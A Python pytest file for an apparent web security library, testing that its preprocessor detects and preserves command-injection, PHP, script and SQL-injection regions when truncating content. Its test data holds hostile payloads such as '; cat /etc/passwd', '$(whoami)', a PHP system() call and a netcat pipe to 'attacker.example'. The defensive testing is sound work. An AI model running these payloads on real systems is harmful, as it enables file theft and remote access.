import re

import pytest

from guard_core.detection_engine.preprocessor import ContentPreprocessor
from guard_core.handlers.suspatterns_handler import SusPatternsManager

_CMD_INJECTION_PATTERNS = [
    re.compile(pattern, re.IGNORECASE | re.MULTILINE)
    for pattern, _contexts, category in SusPatternsManager._pattern_definitions
    if category == "cmd_injection"
]


def _cmd_injection_detected(text: str) -> bool:
    return any(pattern.search(text) for pattern in _CMD_INJECTION_PATTERNS)


@pytest.fixture
def pp() -> ContentPreprocessor:
    return ContentPreprocessor(max_content_length=200, preserve_attack_patterns=True)


def test_php_open_tag_does_not_match_bare_php(pp: ContentPreprocessor) -> None:
    regions = pp.extract_attack_regions("phpunit phpstorm telephone")
    assert regions == []


def test_php_open_tag_matches_literal_open_tag(pp: ContentPreprocessor) -> None:
    payload = "<?php system('id'); ?>"
    regions = pp.extract_attack_regions(payload)
    assert regions, "literal <?php must be detected"


def test_extract_attack_regions_detects_semicolon_command_chain(
    pp: ContentPreprocessor,
) -> None:
    payload = "; cat /etc/passwd"
    content = "filler " * 40 + payload
    payload_start = content.index(payload)
    regions = pp.extract_attack_regions(content)
    assert any(start <= payload_start < end for start, end in regions)


def test_extract_attack_regions_detects_backtick_command_substitution(
    pp: ContentPreprocessor,
) -> None:
    payload = "`whoami`"
    content = "filler " * 40 + payload
    payload_start = content.index(payload)
    regions = pp.extract_attack_regions(content)
    assert any(start <= payload_start < end for start, end in regions)


def test_extract_attack_regions_detects_dollar_paren_command_substitution(
    pp: ContentPreprocessor,
) -> None:
    payload = "$(whoami)"
    content = "filler " * 40 + payload
    payload_start = content.index(payload)
    regions = pp.extract_attack_regions(content)
    assert any(start <= payload_start < end for start, end in regions)


def test_extract_attack_regions_detects_piped_command(
    pp: ContentPreprocessor,
) -> None:
    payload = "| nc attacker.example 4444"
    content = "filler " * 40 + payload
    payload_start = content.index(payload)
    regions = pp.extract_attack_regions(content)
    assert any(start <= payload_start < end for start, end in regions)


def test_truncate_safely_preserves_command_injection_payload_past_cutoff() -> None:
    pp = ContentPreprocessor(max_content_length=200, preserve_attack_patterns=True)
    filler = "lorem ipsum dolor sit amet consectetur adipiscing elit " * 10
    payload = "; cat /etc/passwd"
    content = filler + payload

    out = pp.truncate_safely(content)

    assert payload in out
    assert len(out) <= 200


def test_gap_truncation_does_not_fuse_filler_into_preserved_cmd_injection_keyword() -> (
    None
):
    pp = ContentPreprocessor(max_content_length=150, preserve_attack_patterns=True)
    filler_word = "a" * 300
    boundary_space = " "
    preserved_call = "passthru("
    unrelated_filler = "b" * 91
    trigger = ";"
    tail = "moretail"
    content = (
        filler_word
        + boundary_space
        + preserved_call
        + unrelated_filler
        + trigger
        + tail
    )

    regions = pp.extract_attack_regions(content)
    assert regions == [(301, 410)]

    out = pp.truncate_safely(content)

    assert len(out) <= 150
    assert _cmd_injection_detected(content)
    assert _cmd_injection_detected(out), (
        f"gap truncation fused filler into the preserved keyword: {out!r}"
    )


def test_build_result_with_attack_regions_inserts_boundary_on_truncated_gap() -> None:
    pp = ContentPreprocessor(max_content_length=45, preserve_attack_patterns=True)
    content = "a" * 40 + "system(" + "b" * 40

    result = pp._build_result_with_attack_regions_and_context(content, [(40, 47)])

    assert result == "a" * 37 + " system("
    assert len(result) == 45


def test_build_result_with_attack_regions_boundary_only_when_gap_budget_is_one() -> (
    None
):
    pp = ContentPreprocessor(max_content_length=8, preserve_attack_patterns=True)
    content = "a" * 40 + "system(" + "b" * 40

    result = pp._build_result_with_attack_regions_and_context(content, [(40, 47)])

    assert result == " system("
    assert len(result) == 8


def test_truncated_output_interleaves_in_source_order() -> None:
    pp = ContentPreprocessor(max_content_length=350, preserve_attack_patterns=True)

    gap1 = "A" * 50
    gap2 = "B" * 250
    gap3 = "C" * 50
    region1 = "<script>x</script>"
    region2 = "UNION SELECT password FROM users"
    content = f"{gap1}{region1}{gap2}{region2}{gap3}"

    out = pp.truncate_safely(content)

    idx_r1 = out.find("<script")
    idx_g2 = out.find("B")
    idx_r2 = out.find("UNION")
    idx_g3 = out.find("C")

    assert -1 < idx_r1 < idx_g2 < idx_r2 < idx_g3, (
        f"expected source order, got positions: "
        f"r1={idx_r1} g2={idx_g2} r2={idx_r2} g3={idx_g3}"
    )
